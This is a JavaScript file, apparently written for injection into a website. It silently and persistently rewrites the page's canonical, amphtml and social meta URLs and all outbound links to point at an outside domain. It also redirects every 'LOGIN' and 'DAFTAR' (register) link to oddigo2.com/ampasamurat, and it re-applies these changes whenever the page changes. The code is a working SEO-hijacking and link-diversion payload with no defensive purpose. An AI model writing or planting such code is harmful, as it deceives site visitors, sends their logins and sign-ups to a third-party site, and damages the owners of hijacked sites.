
const officialDomain = 'https://www.hilobayhalebnb.com/'; 
const ampDomain = 'https://oddigo2.com/ampasamurat/';

(function () {
  'use strict';

  //IZINDER
  const OFFICIAL = new URL(officialDomain, location.href);
  const AMP = new URL(ampDomain, location.href);

  function getPathFromUrl(u) {
    try {
      const x = new URL(u, location.href);
      return x.pathname + x.search + x.hash;
    } catch (_) {
      return '';
    }
  }

  function computeCanonicalBasePath() {
    const canonicalLink = document.querySelector('link[rel="canonical"]');
    if (!canonicalLink) return '';
    try {
      const u = new URL(canonicalLink.href, location.href);
      return u.pathname + u.search + u.hash;
    } catch (_) {
      return '';
    }
  }

  // APISIEKOENTOEL
  function replaceAnchorTags() {
    const anchors = document.querySelectorAll('a');
    anchors.forEach(anchor => {
      const txt = anchor.textContent.trim().toUpperCase();
      if (txt === 'LOGIN' || txt === 'DAFTAR') {
        if (anchor.href !== AMP.href) anchor.href = AMP.href;
      }
    });
  }

  function forceUrlsToOfficialDomain() {
    const canonicalBasePath = computeCanonicalBasePath();

    // IKICACONIKAL E DJANCOK
    let canonicalLink = document.querySelector('link[rel="canonical"]');
    if (canonicalLink) {
      if (canonicalLink.href !== OFFICIAL.href) canonicalLink.href = OFFICIAL.href;
    } else {
      canonicalLink = document.createElement('link');
      canonicalLink.rel = 'canonical';
      canonicalLink.href = OFFICIAL.href;
      document.head.appendChild(canonicalLink);
    }

    // anchors
    const links = document.querySelectorAll('a[href]');
    links.forEach(link => {
      // Hindari non-http(s): mailto:, tel:, javascript:, dll.
      if (!/^https?:/i.test(link.href)) return;
      if (isSpecialLink(link)) return;

      const relativePath = getPathFromUrl(link.href);
      // NGAPUSI CANOBASED
      const normalized = OFFICIAL.origin + relativePath.replace(canonicalBasePath, '');
      if (link.href !== normalized) link.href = normalized;
    });


    const metaUrls = document.querySelectorAll('meta[property="og:url"], meta[name="twitter:url"]');
    metaUrls.forEach(meta => {
      const content = meta.getAttribute('content') || '';
      if (!/^https?:/i.test(content)) return;
      const metaPath = getPathFromUrl(content);
      const normalized = OFFICIAL.origin + metaPath.replace(canonicalBasePath, '');
      if (meta.content !== normalized) meta.content = normalized;
    });


    let ampLink = document.querySelector('link[rel="amphtml"]');
    if (ampLink) {
      if (ampLink.href !== AMP.href) ampLink.href = AMP.href;
    } else {
      ampLink = document.createElement('link');
      ampLink.rel = 'amphtml';
      ampLink.href = AMP.href;
      document.head.appendChild(ampLink);
    }
  }

  function isSpecialLink(link) {
    const txt = link.textContent.trim().toUpperCase();
    return link.classList.contains('login') ||
           link.classList.contains('register') ||
           link.href === officialDomain ||
           link.href === ampDomain ||
           link.classList.contains('special-link') ||
           txt === 'LOGIN' ||
           txt === 'DAFTAR';
  }


  let initialized = false;
  function init() {
    if (initialized) return;
    initialized = true;

    forceUrlsToOfficialDomain();
    replaceAnchorTags();

    const schedule = (() => {
      let pending = false;
      return () => {
        if (pending) return;
        pending = true;
        (window.requestAnimationFrame || setTimeout)(() => {
          pending = false;
          forceUrlsToOfficialDomain();
          replaceAnchorTags();
        }, 16);
      };
    })();

    if ('MutationObserver' in window) {
      const observer = new MutationObserver(mutations => {
        for (const m of mutations) {
          if (m.type === 'childList') { schedule(); break; }
          if (m.type === 'attributes' && (m.attributeName === 'href' || m.attributeName === 'content' || m.attributeName === 'rel')) { schedule(); break; }
        }
      });
      observer.observe(document.documentElement, {
        subtree: true,
        childList: true,
        attributes: true,
        attributeFilter: ['href', 'content', 'rel']
      });
    } else {
	
      setInterval(() => {
        forceUrlsToOfficialDomain();
        replaceAnchorTags();
      }, 3000);
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init, { once: true });
  } else {
    init();
  }

  window.replaceAnchorTags = replaceAnchorTags;
  window.forceUrlsToOfficialDomain = forceUrlsToOfficialDomain;
  window.isSpecialLink = isSpecialLink;
})();
